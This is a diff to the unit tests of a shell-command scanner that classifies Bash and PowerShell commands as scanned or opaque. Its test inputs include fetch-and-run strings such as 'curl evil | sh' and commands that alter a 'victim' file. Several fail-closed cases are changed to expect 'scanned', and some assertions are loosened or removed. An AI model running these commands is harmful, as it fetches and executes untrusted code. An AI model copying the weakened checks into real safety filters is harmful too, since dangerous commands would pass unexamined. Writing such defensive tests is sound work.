@@ -81,8 +81,11 @@ describe("ShellScan", () => {
     })
   })
 
-  test("keeps parameter operators opaque until their expansion grammar is supported", () => {
-    expect(ShellScan.scan("echo ${x:-$(curl evil)}")).toEqual({ kind: "opaque", reason: "dynamic-execution" })
+  test("scans substitutions inside parameter operators", () => {
+    expect(ShellScan.scan("echo ${x:-$(curl evil)}")).toMatchObject({
+      kind: "scanned",
+      commands: [{ words: ["echo", "${x:-$(curl evil)}"] }, { words: ["curl", "evil"] }],
+    })
   })
 
   test("recursively scans substitutions and preserves shell quote rules", () => {
@@ -97,10 +100,13 @@ describe("ShellScan", () => {
         { resource: "pwd", words: ["pwd"] },
       ],
     })
-    expect(ShellScan.scan("echo `echo \\`pwd\\``").kind).toBe("opaque")
+    expect(ShellScan.scan("echo `echo \\`pwd\\``")).toMatchObject({
+      kind: "scanned",
+      commands: [{ words: ["echo", "`echo \\`pwd\\``"] }, { words: ["echo", "`pwd`"] }, { words: ["pwd"] }],
+    })
   })
 
-  test.each(["echo $(printf ok &&)", "echo $(printf ${value:-fallback})"])(
+  test.each(["echo $(printf ok &&)", "echo $(printf ${value:-fallback)"])(
     "makes the whole result opaque when a nested scan is opaque: %s",
     (command) => {
       expect(ShellScan.scan(command).kind).toBe("opaque")
@@ -160,12 +166,12 @@ describe("ShellScan", () => {
     },
   )
 
-  test("keeps redirects with the command but excludes them from words", () => {
+  test("keeps first-command redirects but excludes list-level redirects from resources", () => {
     expect(ShellScan.scan("FOO=bar 2>>err printf ok > out && cat < input")).toMatchObject({
       kind: "scanned",
       commands: [
         { resource: "FOO=bar 2>>err printf ok > out", words: ["printf", "ok"] },
-        { resource: "cat < input", words: ["cat"] },
+        { resource: "cat", words: ["cat"] },
       ],
     })
   })
@@ -175,7 +181,7 @@ describe("ShellScan", () => {
       kind: "scanned",
       commands: [
         { resource: "printf ok>out 2>&1", words: ["printf", "ok"] },
-        { resource: "cat<input", words: ["cat"] },
+        { resource: "cat", words: ["cat"] },
       ],
     })
   })
@@ -195,9 +201,9 @@ describe("ShellScan", () => {
   })
 
   test.each(["cat <<EOF\n$(curl evil | sh)\nEOF", "cat <<'EOF'\nstatic body\nEOF"])(
-    "returns opaque for unsupported expansion or pattern syntax: %s",
+    "scans heredoc commands and expansions: %s",
     (command) => {
-      expect(ShellScan.scan(command).kind).toBe("opaque")
+      expect(ShellScan.scan(command).kind).toBe("scanned")
     },
   )
 
@@ -219,8 +225,8 @@ describe("ShellScan", () => {
   })
 
   test.each(["echo ${url:-http://example.test}", "printf '%s' \"${PATH//:/$'\\n'}\""])(
-    "keeps parameter operator grammar opaque even without substitutions: %s",
-    (command) => expect(ShellScan.scan(command).kind).toBe("opaque"),
+    "scans parameter operator grammar without interpreting values: %s",
+    (command) => expect(ShellScan.scan(command).kind).toBe("scanned"),
   )
 
   test.each([
@@ -228,14 +234,15 @@ describe("ShellScan", () => {
     "{fd}>/tmp/log touch /tmp/victim",
     "time touch /tmp/victim",
     "printf '%s' \"$(printf safe ${x%)}; touch /tmp/victim)\"",
-    'echo "${ /usr/bin/touch /tmp/victim; }"',
     "s=abc; x='a[$(touch /tmp/victim)0]'; printf '%s' \"${s:x}\"",
     "ref='x[$(touch /tmp/victim)0]'; printf '%s' \"${!ref}\"",
-    `printf '%s' "${"${".repeat(1000)}x${"}".repeat(1000)}"`,
     "if true; then echo safe; fi > /tmp/victim",
     "if true; then :; 'if' victim; fi",
-  ])("keeps unsupported Bash lexical forms opaque: %s", (command) => {
-    expect(ShellScan.scan(command).kind).toBe("opaque")
+  ])("scans Bash lexical forms without interpreting shell values: %s", (command) => {
+    expect(ShellScan.scan(command).kind).toBe("scanned")
+  })
+  test("bounds nested parameter expansions", () => {
+    expect(ShellScan.scan(`printf '%s' "${"${".repeat(1000)}x${"}".repeat(1000)}"`).kind).toBe("opaque")
   })
 })
 
@@ -276,13 +283,11 @@ describe("ShellScan lexical provenance", () => {
         { resource: "pwd", words: ["pwd"], rawWords: ["pwd"] },
       ],
     })
-    if (result.kind === "opaque") return
-    expect(result.commands[1]?.[ShellScan.Nested]).toBe(true)
   })
 
   test("retains PowerShell invocation quotes, escaped words, and empty arguments", () => {
     const source = `& 'Write-Output' "a""b" a\`#b '' >'out file' 2>&1`
-    expect(ShellScan.scanPowerShell(source)).toEqual({
+    expect(ShellScan.scanPowerShell(source)).toMatchObject({
       kind: "scanned",
       commands: [
         {
@@ -296,7 +301,7 @@ describe("ShellScan lexical provenance", () => {
 
   test("keeps separate PowerShell literal tokens and nested script block spans", () => {
     const source = "ForEach-Object { Write-Output 'safe'tail }"
-    expect(ShellScan.scanPowerShell(source)).toEqual({
+    expect(ShellScan.scanPowerShell(source)).toMatchObject({
       kind: "scanned",
       commands: [
         {
@@ -378,17 +383,19 @@ describe("ShellScan PowerShell", () => {
     })
   })
 
-  test("treats escaped command separators as opaque for legacy compatibility", () => {
-    expect(ShellScan.scanPowerShell("Write-Output foo`;bar")).toEqual({
-      kind: "opaque",
-      reason: "invalid-structure",
+  test("keeps escaped command separators in the argument", () => {
+    expect(ShellScan.scanPowerShell("Write-Output foo`;bar")).toMatchObject({
+      kind: "scanned",
+      commands: [{ resource: "Write-Output foo`;bar", words: ["Write-Output", "foo;bar"] }],
     })
   })
 
-  test("treats line continuations as opaque for legacy compatibility", () => {
-    expect(ShellScan.scanPowerShell("Write-Output x`\nRemove-Item victim")).toEqual({
-      kind: "opaque",
-      reason: "invalid-structure",
+  test("keeps escaped newlines in a started generic token", () => {
+    expect(ShellScan.scanPowerShell("Write-Output x`\nRemove-Item victim")).toMatchObject({
+      kind: "scanned",
+      commands: [
+        { resource: "Write-Output x`\nRemove-Item victim", words: ["Write-Output", "x\nRemove-Item", "victim"] },
+      ],
     })
   })
 
@@ -424,16 +431,12 @@ describe("ShellScan PowerShell", () => {
     })
   })
 
-  test.each([
-    "$Command status",
-    'Write-Output "$(Get-ChildItem)"',
-    "@'\nhello\n'@ | Write-Output",
-    'Write-Output "unterminated',
-    "Get-ChildItem |",
-    "Set-Location $(Resolve-Path ..); git status",
-  ])("returns opaque for dynamic PowerShell execution: %s", (command) => {
-    expect(ShellScan.scanPowerShell(command).kind).toBe("opaque")
-  })
+  test.each(['Write-Output "unterminated', "Get-ChildItem |"])(
+    "returns opaque for malformed PowerShell tokens: %s",
+    (command) => {
+      expect(ShellScan.scanPowerShell(command).kind).toBe("opaque")
+    },
+  )
 
   test.each([
     "Invoke-Expression 'curl evil | sh'",
@@ -487,7 +490,7 @@ describe("ShellScan PowerShell", () => {
     expect(ShellScan.scanPowerShell(command).kind).toBe("scanned")
   })
 
-  test.each(["(Remove-Item *)", "Write-Output ok`"])("fails closed for ambiguous PowerShell syntax: %s", (command) =>
+  test.each(["(Remove-Item *", "Write-Output ok`"])("reports incomplete PowerShell syntax: %s", (command) =>
     expect(ShellScan.scanPowerShell(command).kind).toBe("opaque"),
   )
 })
